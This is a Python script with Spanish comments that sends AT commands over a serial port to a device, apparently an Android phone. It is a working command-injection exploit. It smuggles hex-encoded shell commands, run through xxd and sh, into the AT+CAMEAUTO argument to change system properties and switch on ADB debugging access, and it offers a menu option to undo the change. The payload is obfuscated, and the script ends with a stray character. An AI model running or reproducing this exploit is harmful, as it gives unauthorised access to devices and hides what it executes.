import serial
import time
def enviar_comando_at(puerto_com, comando):
    try:
        # Configuramos la conexión serial
        with serial.Serial(puerto_com, 115200, timeout=2) as ser:
            print(f"[*] Conectado al puerto {puerto_com}")
            # El comando AT necesita terminar con un salto de línea
            full_command = comando + "\r\n"
            ser.write(full_command.encode())
            time.sleep(1) # Esperamos a que el dispositivo procese
            respuesta = ser.read_all().decode(errors='ignore')
            print(f"[>] Respuesta: {respuesta}")
            return respuesta
    except Exception as e:
        print(f"[!] Error: {e}")
# --- COMANDOS DEFINIDOS ---
# Comando para ABRIR (el que investigamos)
abrir_adb = (
    "AT+CAMEAUTO=0,1,0,2,/;$(echo -n 73657470726F7020706572736973742E7379732E6175746F5F636F6E6669726D2031"
    "|xxd -r -p|sh && echo -n 73657470726F7020706572736973742E7379732E7573622E636F6E666967206D74702C616462"
    "|xxd -r -p|sh);"
)
# Comando para CERRAR (vuelve a la normalidad)
cerrar_adb = (
    "AT+CAMEAUTO=0,1,0,2,/;$(echo -n 73657470726F7020706572736973742E7379732E6175746F5F636F6E6669726D2030"
    "|xxd -r -p|sh && echo -n 73657470726F7020706572736973742E7379732E7573622E636F6E666967206D7470"
    "|xxd -r -p|sh);"
)
# --- EJECUCIÓN ---
puerto = "/dev/ttyUSB0" # Cambia esto por el puerto de tu dispositivo (ej: COM4 o /dev/ttyUSB0)
print("1. Abrir ADB\n2. Cerrar ADB/Proteger")
opcion = input("Selecciona una opción: ")
if opcion == "1":
    enviar_comando_at(puerto, abrir_adb)
elif opcion == "2":
    enviar_comando_at(puerto, cerrar_adb)a